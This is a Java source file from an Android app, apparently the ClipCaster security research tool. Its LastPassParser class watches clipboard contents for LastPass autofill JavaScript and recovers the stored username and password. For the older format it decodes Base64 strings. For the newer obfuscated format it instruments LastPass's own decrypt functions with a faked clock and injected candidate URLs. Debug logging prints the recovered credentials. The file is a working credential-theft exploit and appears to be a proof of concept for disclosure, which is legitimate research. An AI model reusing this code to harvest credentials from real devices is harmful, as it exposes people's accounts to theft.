/*
 * Copyright (c) 2014 Xiao Bao Clark
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

package com.actisec.clipcaster.parser;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import com.actisec.clipcaster.R;
import com.actisec.clipcaster.ScrapedCredentials;
import com.actisec.clipcaster.ScrapedData;
import com.actisec.clipcaster.ScrapedDataHandler;
import com.actisec.clipcaster.Source;
import com.actisec.clipcaster.util.JavaScript;
import com.evgenii.jsevaluator.JsEvaluator;
import com.evgenii.jsevaluator.interfaces.JsCallback;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Checks clipboard contents for credentials used by the LastPass fill-to-Chrome
 * feature.
 *
 * For the pre-ClipCaster implementation (credentials unobfuscated) works every time.
 *
 * For the post-ClipCaster implementation it works provided the url visited is listed in the
 * 'login_urls' resource (ie some of the time, it works every time)
 */
public class LastPassParser implements ClipParser {

    /**
     * The regex/Pattern for a call to 'atob', used by the LastPass JavaScript program to
     * convert the user credentials from Base64
     */
    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
    public static Pattern PATTERN = Pattern.compile(REGEX);


    /**
     * The names of the JavaScript functions used to 'encrypt' the credentials in post-ClipCaster
     * LastPass JavaScript programs
     */
    final static String
            //var l_f = function (m <leastsigsecond>) -> roundedtime
            FUNC_GETTIME = "l_f",
            //var l_x = function (t <encrypted> , l <lengthofurl> , m <leastsigsecond>) -> decryptedcred
            FUNC_DECRYPT = "l_x",
            //var l_s = function (c <roundedtime + url >) -> secretkey
            FUNC_DOSHA = "l_s";

    /**
     * The name of the variable we use to put a fake URL into the JavaScript program
     */
    final static String
            VAR_INJECTED_URL = "com_actisec_clipcaster_injectedurl";


    static String[] getUrlsToTry(Context context){
        return context.getResources().getStringArray(R.array.login_urls);
    }

    /**
     * Returns all the URL's in the 'login_urls' resource of a given length.
     *
     * @param context An Android Context
     * @param length The length of URL's to get
     * @return An array of all the URL's in the 'login_urls' resource of size {@code length}
     */
    static String[] getUrlsOfLength(Context context, int length){
        List<String> ofLength = new ArrayList<String>();
        String[] fullList = getUrlsToTry(context);
        for(String url: fullList){
            if(url.replaceFirst("https?://","").length() == length){
                ofLength.add(url);
            }
        }
        return ofLength.toArray(new String[ofLength.size()]);
    }


    @Override
    public void onClip(Context context, ScrapedDataHandler handler, String contents) {
        Parser parser = new Parser(context, handler, System.currentTimeMillis());
        parser.getData(contents);
    }

    /**
     * A class that contains the logic for asynchronously parsing a LastPass JavaScript program
     * and notifying a ScrapedDataHandler of the result
     */
    public static class Parser{
        final Context mContext;
        final ScrapedDataHandler mHandler;
        final ScrapedData mScrapedData;


        /**
         * Constructor
         * @param context An Android Context
         * @param handler The object that wishes to be notified of potential credentials found
         * @param timeOfEntry The time the script was created. Must be less than 10 seconds after
         *                    the actual time
         */
        public Parser(Context context, ScrapedDataHandler handler, long timeOfEntry) {
            mContext = context;
            mHandler = handler;

            mScrapedData = new ScrapedData();
            mScrapedData.source = new Source();
            mScrapedData.source.timeOfNotification = timeOfEntry;
        }

        /**
         * Extracts the credentials and notifies the handler passed in the constructor
         *
         * @param string The LastPass JavaScript program
         */
        public void getData(String string) {

            //  get a matcher object
            Matcher m = PATTERN.matcher(string);
            List<String> creds = new ArrayList<String>(2);
            while (m.find()) {
                creds.add(m.group(1));
            }
            if(creds.isEmpty()){
                return;
            }
            mScrapedData.source.javascriptProgram = string;
            // Try the old way
            mScrapedData.creds = new ScrapedCredentials(new String(Base64.decode(creds.get(0).getBytes(), 0)), new String(Base64.decode(creds.get(1).getBytes(), 0)));
            if (!sCheckString(mScrapedData.creds.user) || !sCheckString(mScrapedData.creds.pass)) {
                mScrapedData.creds = null;
                //Try the new way
                try {
                    getCredsFromJs(string, mScrapedData.source.timeOfNotification);
                } catch (TimeoutException | InterruptedException | ExecutionException e) {
                    Log.e("ClipCaster", "Error getting credentials: " + e.toString());
                    Log.d("ClipCaster", Log.getStackTraceString(e));
                }
            }
        }

        /**
         * Tries to decrypt credentials in post-ClipCaster LastPass JavaScript programs
         *
         * @param js The JavaScript program
         * @param time The approximate unix time the program was created. Must be less than 10 seconds
         *             after the actual time
         * @throws TimeoutException The decryption timed out
         * @throws ExecutionException The decryption program could not be run (probably due to LastPass
         *                  changing up their program)
         * @throws InterruptedException The decryption program's execution was interrupted
         */
        void getCredsFromJs(String js, long time) throws TimeoutException, ExecutionException, InterruptedException {

            JavaScript program = new JavaScript(js);
            String decryptProgram = createDecryptProgram(program, time);

            final String[] userParams = program.getParams(FUNC_DECRYPT, 0),
                    passParams = program.getParams(FUNC_DECRYPT,1);
            if(userParams == null || passParams == null){
                return;
            }

            String[] urls = getUrlsOfLength(mContext, Integer.parseInt(userParams[1]));
            tryDecryption(decryptProgram,userParams,passParams, urls);
        }

        void tryDecryption(String decryptProgram, String[] userParams, String[] passParams, String[] urls) throws TimeoutException, ExecutionException, InterruptedException {
            mScrapedData.creds = new ScrapedCredentials();
            for(String url : urls){
                tryDecryption(createInjectedUrl(url) + decryptProgram,userParams,passParams, new DecryptJsCallback(url));
            }
        }


        /**
         * Asynchronously executes the decryption program, returning the decrypted credentials to be parsed
         * by {@link com.actisec.clipcaster.parser.LastPassParser.Parser.DecryptJsCallback}
         *
         * @param decryptProgram The program that can decrypt the credentials. Must implement {@link #FUNC_DECRYPT}
         * @param userParams The parameters to {@link #FUNC_DECRYPT} for the username
         * @param passParams The parameters to {@link #FUNC_DECRYPT} for the password
         * @param callback The callback to be notified when it's done
         */
        void tryDecryption(String decryptProgram, String[] userParams, String[] passParams, DecryptJsCallback callback) throws TimeoutException, ExecutionException, InterruptedException {
            String program = decryptProgram + createCall("btoa",new String[] {createCall(FUNC_DECRYPT,userParams) }) + " + \',\' + " + createCall("btoa",new String[] {createCall(FUNC_DECRYPT,passParams) });
            Log.d("TEST", "Getting cred by running " + program);
            new JsEvaluator(mContext).evaluate(program, callback);
        }

        /**
         * A class that will check the results of a JavaScript execution for credentials.
         *
         * Expects the credentials in the form
         *
         * {@code username,password}
         *
         * Uses {@link #sCheckString(String)} to determine if they are valid.
         *
         * If they're valid, notifies the {@link #mHandler}
         */
        private class DecryptJsCallback implements JsCallback {
            private String mUrl;

            /**
             * Constructor
             * @param url The url that the current execution is being attempted with. This is
             *            included in the {@link com.actisec.clipcaster.ScrapedData} if
             *            credentials are found
             */
            public DecryptJsCallback(String url) {

                mUrl = url;
            }

            @Override
            public void onResult(String result) {
                int commaIdx = result.indexOf(',');
                if(commaIdx <= 0)
                    return;

                Log.d("TEST", "Got " + result);
                String user = new String(Base64.decode(result.substring(0, commaIdx), Base64.DEFAULT));
                Log.d("TEST", "User " + user);
                String pass = new String(Base64.decode(result.substring(commaIdx + 1), Base64.DEFAULT));
                Log.d("TEST", "Pass " + pass);
                if (sCheckString(user) && sCheckString(pass)) {
                    ScrapedData data = new ScrapedData(mScrapedData);
                    data.creds.user = user;
                    data.creds.pass = pass;
                    data.destinationUrl = mUrl;

                    mHandler.handleData(data);
                }
            }
        }
    }


    /**
     * Returns JavaScript that declares a variable containing 'url'. The variables name is taken from
     * {@link #VAR_INJECTED_URL}
     * Converts it to Base64 to avoid parse errors
     * @param url The url to be injected
     * @return The declaration of the variable
     */
    static String createInjectedUrl(String url){
        return "var " + VAR_INJECTED_URL + "= atob('" + Base64.encodeToString(url.getBytes(),Base64.NO_WRAP) + "');";
    }

    /**
     * Returns JavaScript that calls a function with the given arguments
     * @param funcName The function to call
     * @param args The arguments
     * @return JavaScript calling 'funcName' with 'args'
     */
    static String createCall(String funcName, String[] args){
        String result = funcName + "(";
        for (int i = 0; i < args.length; i++) {
            String arg = args[i];
            result += arg;
            if(i != args.length - 1){
                result += ',';
            }
        }
        return result + ")";
    }


    /**
     * Given a LastPass JavaScript program and the approximate time it was created, returns
     * a modified subset of the program.
     *
     * When this is done, the function {@link #FUNC_DECRYPT} can be called with the arguments passed
     * in the original program.
     *
     * The modified script will use {@code time} (rather than the current time) and an
     * undeclared variable with name {@link #VAR_INJECTED_URL} (rather than the current document's
     * url) to decrypt the arguments
     *
     * @param program The LastPass JavaScript program to modify
     * @param time The approximate unix time the program was created. Must be less than 10 seconds after
     *             the actual time
     * @return The modified program
     */
    static String createDecryptProgram(JavaScript program, long time){
        String decryptFunc = instrumentDecryptFunctionWithLocation(program,VAR_INJECTED_URL);
        String getTimeFunc = instrumentTimeFunction(program, time);
        String shaFunc = program.getFunction(FUNC_DOSHA);
        return getTimeFunc + ';' + shaFunc + ';' + decryptFunc + ';';
    }


    /**
     * Replaces the 'Date.getTime()' function to always return a given time, essentially tricking
     * the rest of the script into thinking it's always running at that time
     * @param program The program to instrument
     * @param time The approximate unix time the program was created. Must be less than 10 seconds
     *             after the actual time
     * @return The instrumented time function. When {@link #FUNC_GETTIME} is called, it will always
     *          return {@code time}
     */
    static String instrumentTimeFunction(JavaScript program, long time){
        final String
                CLOCK_OVERRIDE= "Date.prototype.getTime = function(){return " + time + "; };";
        return CLOCK_OVERRIDE + program.getFunction(FUNC_GETTIME);

    }

    /**
     * Replaces the 'document.location.href' accessor in {@link #FUNC_DECRYPT} with a given String
     * @param program The program to instrument. Must contain a function {@link #FUNC_DECRYPT}
     * @param location The text to replace 'document.location.href'
     * @return The {@link #FUNC_DECRYPT} function, modified to use {@code location} rather than
     *          'document.location.href'
     */
    static String instrumentDecryptFunctionWithLocation(JavaScript program, String location){
        return program.getFunction(FUNC_DECRYPT).replace("document.location.href",location);
    }


    /**
     * Checks to see if it is a garbage string. Works only for ASCII type
     * encodings
     * @param toCheck The String to check
     * @return true if it does not contain control characters, false otherwise
     */
    public static boolean sCheckString(String toCheck) {
        char[] array = toCheck.toCharArray();
        for (char c : array) {
            if (c < 33 || c > 126) {
                return false;
            }
        }
        return true;
    }


}
